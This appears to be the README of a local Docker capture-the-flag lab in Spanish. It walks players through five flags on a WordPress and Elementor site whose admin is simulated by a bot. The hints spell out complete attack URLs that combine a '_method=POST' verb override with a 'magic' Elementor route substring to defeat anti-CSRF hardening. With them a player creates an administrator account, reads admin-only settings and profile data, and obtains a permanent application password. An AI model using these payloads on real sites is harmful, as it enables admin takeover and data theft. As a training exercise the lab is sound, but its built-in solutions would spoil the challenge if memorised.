# CTF — «La Subcadena Mágica»

Modo reto del laboratorio: una instalación **WordPress 7.1.2 + Elementor 4.3.1**
idéntica a la víctima del lab, pero **con el hardening anti-CSRF activo desde
el inicio** (un mu-plugin con el patrón canónico de los plugins de seguridad:
cookies-sin-nonce denegadas en REST). 5 flags progresivas que te obligan a
redescubrir, por ti mismo, todos los vectores del repo.

## Montaje

```bash
make ctf          # sitio del reto en http://localhost:8087 + bot en :8088
```

- **Sitio del reto**: http://localhost:8087 — *no conoces ninguna credencial*.
- **Bot víctima**: http://localhost:8089 — el admin de pruebas
  (`editor-demo`, administrador del sitio) tiene la sesión iniciada. Le pegas
  una URL, hace clic (un GET de navegador, nada más) y el bot te enseña el
  resultado. El bot **nunca** revela sus cookies ni su contraseña, y solo
  visita el host del reto.
- Verificación: `./ctf/verificar.sh <n> "<tu respuesta>"`.

## Reglas

1. Todo tu "acceso" a la víctima pasa por el bot (o por la URL que le des).
2. Prohibido leer `ctf/SOLUCION.md` y las tripas de los contenedores hasta
   terminar (estás jugando contra ti mismo).
3. El sitio del reto está en la lista de permitidos del bot; nada más.

## Los 5 retos

### FLAG 1 · Recon (calentando)
> ¿Qué versión de Elementor corre el sitio? Demuéstralo sin credenciales.

<details><summary>Pistas</summary>

1. WordPress filtra información de los plugins en ficheros públicos.
2. `/wp-content/plugins/<slug>/readme.txt`
3. `curl -s http://localhost:8087/wp-content/plugins/elementor/readme.txt | grep Stable`

**Verifica**: `./ctf/verificar.sh 1 "x.y.z"`
</details>

### FLAG 2 · El clic
> Crea tu propia cuenta de administradora/o **con el nombre y la contraseña
> que tú elijas**, inicia sesión en :8087 y lee el post **privado** del admin.

<details><summary>Pistas</summary>

1. El ataque canónico del lab: un GET a `/wp-json/wp/v2/users` con override
   de verbo y el parámetro que da nombre a esta vulnerabilidad.
2. Ojo: el sitio tiene hardening anti-CSRF. Tu primer intento devolverá
   `rest_cookie_disabled`... ¿y si le añades la subcadena mágica a la query?
3. `http://localhost:8087/wp-json/wp/v2/users?_method=POST&username=TUNICK&email=TUNICK@ctf.local&password=TUCLAVE&roles[]=administrator&x=elementor/v1/events/`
   → pásasela al bot → luego inicia sesión en `http://localhost:8087/wp-admin`
   con TUNICK/TUCLAVE.

**Verifica**: `./ctf/verificar.sh 2 "CTF{...}"`
</details>

### FLAG 3 · La lectura
> Sin crear nada: filtra el `admin_email` del sitio por REST. La flag ES el
> email. La subcadena mágica viaja escondida dentro de OTRO parámetro.

<details><summary>Pistas</summary>

1. `/wp-json/wp/v2/settings` como anónima/o no deja; el admin sí puede leerlo.
2. Haz que el admin lo lea: bot + `?context=edit` + truco de la subcadena.
3. `http://localhost:8087/wp-json/wp/v2/settings?q=informe-elementor/v1/events/-2026`

**Verifica**: `./ctf/verificar.sh 3 "CTF{...}@ctf.local"`
</details>

### FLAG 4 · La enumeración
> Alguien dejó una nota en el perfil del becario `huevo`. Léela.

<details><summary>Pistas</summary>

1. La descripción de usuario no sale en el listado público.
2. `context=edit` sí la muestra... a la administración.
3. Encuentra el ID de `huevo` y pide `/wp/v2/users/<id>?context=edit&x=elementor/v1/events/` al bot.

**Verifica**: `./ctf/verificar.sh 4 "CTF{...}"`
</details>

### FLAG 5 · La puerta silenciosa (final)
> Sin crear usuarios NI loguearte en wp-admin: consigue una credencial
> PERMANENTE del admin que ya no necesite ni cookies ni nonce.

<details><summary>Pistas</summary>

1. Application Passwords: se crean por REST y la respuesta devuelve la
   contraseña en claro. Requiere HTTPS... o un entorno local.
2. El override de verbo también funciona ahí: `_method=POST` sobre
   `/wp-json/wp/v2/users/me/application-passwords` con un `name` a tu gusto.
3. `http://localhost:8087/wp-json/wp/v2/users/me/application-passwords?_method=POST&name=TUNICK&x=elementor/v1/events/`
   → el bot te devuelve la contraseña → `./ctf/verificar.sh 5 "TUNICK:contraseña"`

**Verifica**: `./ctf/verificar.sh 5 "TUNICK:xxxx xxxx xxxx xxxx xxxx"`
</details>

## Desmontaje

```bash
make ctf-clean
```

---

## Para quien organiza

- Solución completa: [`ctf/SOLUCION.md`](SOLUCION.md) (spoilers).
- Flags canónicas (para preparar): 1 = versión de Elementor · 2 = la cadena
  del post privado · 3 = el admin_email · 4 = la nota del huevo · 5 = valida
  dinámicamente el app-password contra la cuenta del admin.
- El bot solo acepta http/https y el host del reto (guard anti-SSRF), abre
  sesión nueva por visita y recorta las respuestas a 4 KB.
- Todo el reto corre en Docker local; nada sale de tu máquina.
